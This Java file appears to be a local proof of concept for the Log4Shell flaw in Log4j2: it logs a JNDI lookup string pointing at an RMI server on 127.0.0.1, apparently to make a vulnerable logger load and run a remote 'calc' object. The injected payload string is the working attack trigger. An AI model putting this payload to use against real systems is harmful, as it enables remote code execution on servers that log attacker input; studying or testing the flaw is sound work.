package com.fhdone.paper2019.util.log4jhack;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {
    private static org.apache.logging.log4j.Logger logger= LogManager.getLogger(Log4j2Test.class);
    public static void main(String[] args) {
        String username="${jndi:rmi://127.0.0.1:1099/calc}";
        logger.error(username);
        try {
            Thread.sleep(5000);
        } catch (Exception e) {
        }
    }
}
